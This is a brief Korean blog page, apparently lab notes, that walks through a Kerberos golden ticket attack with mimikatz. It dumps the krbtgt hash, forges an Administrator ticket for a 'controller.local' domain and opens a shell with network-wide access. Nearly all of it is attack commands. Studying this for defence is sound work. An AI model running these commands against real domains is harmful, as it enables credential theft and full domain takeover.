---
layout: page
title: Golden_Ticket_Attack
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


mimikatz 사용


#### krbtgt 해시 덤프

```powershell
./mimikatz.exe
```

```powershell
privilege::debug
```

```powershell
lsadump::lsa /inject /name:krbtgt
```

![Pasted_image_20250823213403.png](/image/Pasted_image_20250823213403.png)

```powershell
kerberos::golden /user:"Administrator" /domain:"controller.local" /sid:"S-1-5-21-849420856-2351964222-986696166" /krbtgt:"5508500012cc005cf7082a9a89ebdfdf" /id:500
```

![Pasted_image_20250823215128.png](/image/Pasted_image_20250823215128.png)

```powershell
# 모든 컴퓨터에 대해 상승된 권한이 있는 새 명령 프롬프트가 열림
misc::cmd
```

![Pasted_image_20250823215141.png](/image/Pasted_image_20250823215141.png)

이제 네트워크의 다른 모든 시스템에 액세스할 수 있는 또 다른 명령 프롬프트가 표시됩니다.

![Pasted_image_20250823215149.png](/image/Pasted_image_20250823215149.png)

![Pasted_image_20250823215249.png](/image/Pasted_image_20250823215249.png)

